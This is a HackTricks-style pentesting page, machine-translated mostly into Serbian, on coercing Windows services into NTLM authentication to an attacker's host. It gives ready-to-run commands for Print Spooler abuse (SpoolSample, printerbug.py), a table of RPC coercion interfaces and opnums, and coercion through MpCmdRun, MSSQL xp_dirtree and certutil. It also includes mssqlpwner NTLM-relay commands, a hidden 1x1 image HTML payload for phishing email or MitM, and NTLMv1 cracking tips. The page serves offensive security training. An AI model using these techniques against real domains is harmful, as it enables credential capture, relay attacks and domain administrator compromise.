# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **remote authentication triggers** napisanih u C# koristeći MIDL compiler kako bi se izbegle zavisnosti trećih strana.

## Zloupotreba Spooler servisa

Ako je _**Print Spooler**_ servis **omogućen**, možete koristiti neke već poznate AD kredencijale da **zatražite** od print servera kontrolera domena ažuriranje o novim štampanim poslovima i jednostavno mu kažete da **pošalje obaveštenje nekom sistemu**.\
Napomena: kada printer pošalje obaveštenje proizvoljnom sistemu, on mora da se **autentifikuje prema** tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, i servis će pri toj autentifikaciji **koristiti kompjuterski nalog**.

### Pronalaženje Windows servera na domenu

Koristeći PowerShell, dobijte listu Windows mašina. Serveri su obično prioritet, pa se fokusirajmo na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Pronalaženje Spooler servisa koji slušaju

Koristeći blago izmenjeni @mysmartlogin-ov (Vincent Le Toux-ov) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler Service sluša:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Takođe možete koristiti rpcdump.py na Linuxu i tražiti MS-RPRN Protocol.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Zatražite od servisa da se autentifikuje prema proizvoljnom hostu

Možete da kompajlirate [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
или користите [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) или [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ако сте на Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinovanje sa Unconstrained Delegation

Ako je napadač već kompromitovao računar sa [Unconstrained Delegation](unconstrained-delegation.md), napadač može da natera štampač da se **autentifikuje prema tom računaru**. Zbog unconstrained delegation, **TGT** **računarskog naloga štampača** će biti **sačuvan u memoriji** računara koji ima unconstrained delegation. Pošto je napadač već kompromitovao taj host, moći će da **preuzme ovaj tiket** i zloupotrebi ga ([Pass the Ticket](pass-the-ticket.md)).

## RPC: forsiranje autentifikacije

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfejsi/opnums koji pokreću odlaznu autentifikaciju)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: Ove metode prihvataju parametre koji mogu sadržati UNC putanju (npr., `\\attacker\share`). Kada se obrade, Windows će se autentifikovati (u kontekstu mašine/korisnika) prema toj UNC lokaciji, što omogućava hvatanje NetNTLM ili relay.

### MS-EVEN: ElfrOpenBELW (opnum 9) prisila
- Interfejs: MS-EVEN preko \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Potpis poziva: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Efekat: meta pokušava da otvori prosleđenu putanju rezervne log datoteke i autentifikuje se prema UNC pod kontrolom napadača.
- Praktična upotreba: naterati Tier 0 resurse (DC/RODC/Citrix/etc.) da emituju NetNTLM, a zatim relay-ovati prema AD CS endpointima (ESC8/ESC11 scenariji) ili drugim privilegovanim servisima.

## PrivExchange

Napad `PrivExchange` je posledica propusta u **Exchange Server `PushSubscription` feature**. Ova funkcija omogućava da bilo koji domen korisnik sa mailbox-om natera Exchange server da se autentifikuje prema bilo kom hostu koji klijent obezbedi preko HTTP-a.

Po difoltu, **Exchange service radi kao SYSTEM** i dobija prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domen pre-2019 Cumulative Update**). Ovaj propust se može iskoristiti za omogućavanje **relay-ovanja informacija prema LDAP-u i naknadno izvlačenje domain NTDS baze**. U slučajevima kada relay na LDAP nije moguć, ovaj propust može i dalje da se iskoristi za relay i autentifikaciju prema drugim hostovima u domenu. Uspešna eksploatacija ovog napada omogućava trenutni pristup Domain Admin-u koristeći bilo koji autentifikovani domen nalog.

## Unutar Windows

Ako se već nalazite unutar Windows mašine, možete naterati Windows da se poveže na server koristeći privilegovane naloge pomoću:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (Microsoft-ov potpisani binarni fajl) da prisilite NTLM autentifikaciju:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Ako znate **email address** korisnika koji se prijavljuje na mašinu koju želite kompromitovati, možete mu jednostavno poslati **email with a 1x1 image** kao
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i kada ga otvori, pokušaće da se autentifikuje.

### MitM

Ako možeš da izvedeš MitM napad na računar i ubaciš HTML u stranicu koju će korisnik videti, možeš pokušati da ubaciš sliku kao sledeću u stranicu:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Ostali načini za prisiljavanje i phish NTLM autentikacije


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ako možete da presretnete [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Zapamtite da, da biste crack NTLMv1, morate postaviti Responder challenge na "1122334455667788"_

## Reference
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
